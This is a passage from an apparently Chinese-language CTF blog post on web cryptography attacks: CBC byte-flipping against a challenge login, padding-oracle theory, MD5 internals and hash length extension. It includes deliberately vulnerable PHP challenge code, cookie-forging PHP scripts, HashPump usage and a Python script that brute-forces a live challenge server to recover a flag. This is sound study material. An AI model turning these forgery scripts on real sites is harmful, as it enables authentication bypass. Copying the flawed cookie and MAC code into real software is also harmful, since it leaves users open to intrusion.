class="line">        $(<span class="string">".password"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>解题<br>得cipher</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#计算cipher</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    明文1：a:2:&#123;s:8:"userna        //r</span></span><br><span class="line"><span class="comment">    明文2：me";s:5:"admiy";        //l字母在第14个字节</span></span><br><span class="line"><span class="comment">    明文3：s:8:"password";s</span></span><br><span class="line"><span class="comment">    明文4：:6:"passwd";&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $cipher = base64_decode(urldecode(<span class="string">'6HJUuK%2BgTYFjGKKdQKrvqG4lQyZNT3A7kl42ipzlqI7M%2BoSGPbRgihwSFPqmfVY2ScFMSuJpCsOgRbTp%2Bpn94Q%3D%3D'</span>));</span><br><span class="line">    $temp = $cipher;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    设密文1[13]=A, 解密(密文2)[13]=B,  明文2[13]=C,  </span></span><br><span class="line"><span class="comment">    将A修改为A ^ C,则:</span></span><br><span class="line"><span class="comment">    A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//                      A                 C          X</span></span><br><span class="line">    $cipher[<span class="number">13</span>] = chr(ord($cipher[<span class="number">13</span>]) ^ ord(<span class="string">'y'</span>) ^ ord(<span class="string">'n'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(base64_encode($cipher));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/2.jpg" alt=""><br>得iv</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#计算iv</span></span><br><span class="line">$res = base64_decode(<span class="string">'RWn5qVqquwKuATc4kqaobG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6InBhc3N3ZCI7fQ=='</span>);<span class="comment">//这里放burp放回的base64数据</span></span><br><span class="line">$iv = base64_decode(urldecode(<span class="string">'Yfz1VNAk9RvNa09MCezJRA%3D%3D'</span>)); <span class="comment">//这里放cookie中的iv</span></span><br><span class="line">$plaintext = <span class="string">'a:2:&#123;s:8:"userna'</span>;</span><br><span class="line">$new_iv = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i ++)&#123;</span><br><span class="line">$new_iv = $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode($new_iv));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/3.jpg" alt=""></p><h2 id="Padding-oracle"><a href="#Padding-oracle" class="headerlink" title="Padding oracle"></a>Padding oracle</h2><p>分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:<br><img src="../../images/cipher/web/5.jpg" alt=""><br>这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03<br><img src="../../images/cipher/web/4.jpg" alt=""><br>因为填充发生在最后一个分组，所以我们主要关注最后一个分组<br><img src="../../images/cipher/web/6.jpg" alt=""><br>这里有个条件是服务器会对我们显示padding error的异常，如果不回显那么肯定无法判断进行利用</p><p>比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。</p><p>攻击成立的两个重要假设前提:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</span><br><span class="line">2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果</span><br></pre></td></tr></table></figure><h1 id="HASH"><a href="#HASH" class="headerlink" title="HASH"></a>HASH</h1><p><strong>HASH原理</strong><br><img src="../../images/cipher/web/7.jpg" alt=""><br>首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以64位一组进行分组。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p><p>为确保同一个字符串的hash值唯一，所以需要保证第一次registers的值也唯一。所以在hash算法中，registers具有初始值。如上图中的registers值0。</p><p><strong>MD5算法实现</strong><br>我们要实现对于字符串abc的 md5 的值计算。首先我们要把其转化为 16 进制。<br><img src="../../images/cipher/web/8.jpg" alt=""></p><p>补位<br>（1byte=8bit）消息必须进行补位，即使得其长度在对 512 取模后的值为 448。也就是说，len(message) % 512 == 448。当消息长度不满 448 bit 时（注意是位，而不是字符串长度），消息长度达到 448 bit 即可。当然，如果消息长度已经达到 448 bit，也要进行补位。补位是必须的。<br>补位的方式的二进制表示是在消息的后面加上一个1，后面跟着无限个0，直到 len(message) % 512 == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息abc进行补位到 448 bit，也就是 56 byte。<br><img src="../../images/cipher/web/9.jpg" alt=""><br>补位过后，第 57 个字节储存的是补位之前的消息长度。abc是 3 个字母，也就是 3 个字节，24 bit。换算成 16 进制为 0x18。其后跟着 7 个字节的 0x00，把消息补满 64 字节。<br>MD5中存储的都是小端方式！<br>重要的事情说三遍，举个例子：假如我们这一块值为0x12345678<br>那么在MD5运算时候存储的顺序是 0x78563412<br>这也是之所以后8字节为长度，而第1字节先有数据的原因<br><img src="../../images/cipher/web/10.jpg" alt=""></p><p>计算消息摘要<br>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>上面的链变量将会被新的值覆盖。之后有四个非线性函数，将字符串和那四个链接变量经过一系列的复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，也就是只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，就需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值。</p><p><strong>哈希长度扩展攻击</strong>  </p><p>Hash-Length-Extension-Attack ，可以在知道MD5(message)的hash值得情况下，算出MD5(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。 </p><p>所需条件： </p><ul><li>知道Salt的长度</li><li>要知道一个由salt加密后的md5值</li><li>知道$data的值(未加盐的明文)</li></ul><p><strong>例题1：</strong><br>ISCC2018 的一道题目<br>secret.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=<span class="string">'123456789qwertyuiopasdfghjklzxcvbnm12345671475'</span>;</span><br><span class="line">$flag=<span class="string">'flag&#123;this_1s_a_f1ag&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hash.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>解题<br>从源码可以得到以下内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc(&quot;guest&quot;)的值  </span><br><span class="line">$key的长度为46</span><br></pre></td></tr></table></figure><p>这段代码要求我们输入的username在经过enc函数加密之后，与<code>$_COOKIE[‘verify’]</code>的值相等，并且username中必须含有admin</p><p>使用hashdump工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 已知的<span class="built_in">hash</span>值，这里是<span class="variable">$_COOKIE</span>[<span class="string">'verify'</span>]的值</span><br><span class="line">Input Data: 上面的<span class="built_in">hash</span>值解密后的字符串，这里是guest。</span><br><span class="line">Input Key Length: <span class="variable">$key</span>的长度</span><br><span class="line">Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。</span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/11.jpg" alt=""><br>然后我们将得到的hash值去替换数据包中<code>$_COOKIE[‘verify’]</code>的值，然后post提交<code>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</code>即可。<br><img src="../../images/cipher/web/12.jpg" alt=""></p><p><strong>例题2：</strong><br>jarvis oj 的web题  flag在管理员手中吗?<br>index.php~泄露得源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $auth = <span class="keyword">false</span>;</span><br><span class="line">        $role = <span class="string">"guest"</span>;</span><br><span class="line">        $salt =</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $s = serialize($role);</span><br><span class="line">            setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">            $hsh = md5($salt.strrev($s));</span><br><span class="line">            setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure><p>安装hash_extender步骤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/hash_extender </span><br><span class="line"><span class="built_in">cd</span> hash_extender </span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>然后python脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="comment">#print x</span></span><br><span class="line">        <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</span><br><span class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="keyword">print</span> ret</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意这个脚本在hash_extender目录下使用</p><p>然后得到回显:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;h3&gt;Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; &lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>参考文章：<br>常见的Web密码学攻击方式汇总：<a href="https://www.anquanke.com/post/id/84724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84724</a><br>Padding Oracle 和 CBC字节翻转攻击学习：<a href="https://www.cnblogs.com/tr1ple/p/11114958.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11114958.html</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485857&idx=1&sn=1cf534df42999d5126fc3cf3b7fc8f9b" target="_blank" rel="noopener"><code>*CTF 2021 WriteUp By 星盟ctf战队</code></a><br>CBC字节翻转攻击: <a href="http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a><br>CBC字节翻转攻击:<a href="https://sec-in.com/article/274" target="_blank" rel="noopener">https://sec-in.com/article/274</a><br>Padding Oracle 和 CBC字节翻转攻击学习: <a href="https://www.cnblogs.com/tr1ple/p/11114958.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11114958.html</a><br>Padding Oracle Attack: <a href="http://www.helix.cool/2020/05/18/Padding-Oracle-Attack/" target="_blank" 